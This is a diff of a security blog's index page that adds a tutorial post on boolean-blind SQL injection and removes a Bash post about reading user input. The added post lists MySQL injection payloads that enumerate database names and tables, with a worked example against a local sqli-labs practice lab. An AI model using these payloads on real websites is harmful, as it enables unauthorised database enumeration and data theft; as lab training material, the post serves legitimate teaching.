@@ -158,6 +158,108 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/27/SQLInjectionBooleanBlind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/27/SQLInjectionBooleanBlind/" class="post-title-link" itemprop="url">Boolean Blind SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-27 20:20:57" itemprop="dateCreated datePublished" datetime="2016-10-27T20:20:57-04:00">2016-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 20:29:50" itemprop="dateModified" datetime="2023-10-18T20:29:50-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Boolean Blind Sql Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Boolean-Blind-SQL-Injection-Method"><a href="#Boolean-Blind-SQL-Injection-Method" class="headerlink" title="Boolean Blind SQL Injection Method"></a>Boolean Blind SQL Injection Method</h1><ol>
+<li><p>First, obtain the length of the database name:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;n --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Next, retrieve the database name character by character:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr(database(),1,1))&gt;n) --+</span><br></pre></td></tr></table></figure>
+<p>Note: To determine the character at a specific position, you can use a binary search method.<br>To obtain the second character of the database name, simply change the position in the “substr” function.</p>
+</li>
+<li><p>Use Burp Suite’s Intruder module to iterate through the possibilities.</p>
+</li>
+<li><p>Obtain the number of tables:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Retrieve the length of the tables.<br>These steps outline a method for conducting a blind Boolean-based SQL injection to gather information about a database, such as the database name and the number of tables.</p>
+</li>
+</ol>
+<h1 id="Example-of-Boolean-Blind-SQL-Injection-Operation"><a href="#Example-of-Boolean-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Boolean Blind SQL Injection Operation"></a>Example of Boolean Blind SQL Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; </span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=1 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=2 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 3 --+  correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 4 --+  error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;7 --+   correct  database name&#x27;s length &lt;=8</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;8 --+   error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;114) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;115) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 4 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 100) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 101) --+</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/SQLInjectionUnion/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1069,87 +1171,6 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2012/03/13/BashScript04-ReadingUserInput/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2012/03/13/BashScript04-ReadingUserInput/" class="post-title-link" itemprop="url">Bash Scripting 04 - Reading User Input</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2012-03-13 21:21:31" itemprop="dateCreated datePublished" datetime="2012-03-13T21:21:31-04:00">2012-03-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-23 21:49:39" itemprop="dateModified" datetime="2023-10-23T21:49:39-04:00">2023-10-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/" itemprop="url" rel="index"><span itemprop="name">Bash</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/Bash-Scripting-04-Reading-User-Input/" itemprop="url" rel="index"><span itemprop="name">Bash Scripting 04 - Reading User Input</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Command-line arguments are a form of user input, but we can also capture interactive user input<br>while a script is running with the read command. In this example, we will use read to capture user<br>input and assign it to a variable:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./input.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello there, would you like to learn how to hack: Y/N?&quot;</span></span><br><span class="line"><span class="built_in">read</span> answer</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Your answer was <span class="variable">$answer</span>&quot;</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./input.sh</span><br><span class="line">kali@kali:~$ ./input.sh</span><br><span class="line">Hello there, would you like to learn how to hack: Y/N?</span><br><span class="line">Y</span><br><span class="line">Your answer was Y</span><br></pre></td></tr></table></figure>
-
-<p>We can alter the behavior of the read command with various command line options. Two of the<br>most commonly used options include -p, which allows us to specify a prompt, and -s, which makes<br>the user input silent. The latter is ideal for capturing user credentials:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./input2.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Prompt the user for credentials</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&#x27;Username: &#x27;</span> username</span><br><span class="line"><span class="built_in">read</span> -sp <span class="string">&#x27;Password: &#x27;</span> password</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Thanks, your creds are as follows: &quot;</span> <span class="variable">$username</span> <span class="string">&quot; and &quot;</span> <span class="variable">$password</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./input2.sh</span><br><span class="line">kali@kali:~$ ./input2.sh</span><br><span class="line">Username: kali</span><br><span class="line">Password:</span><br><span class="line">Thanks, your creds are as follows: kali and nothing2see!</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1221,19 +1242,19 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">63</span>
+        <span class="site-state-item-count">65</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">22</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
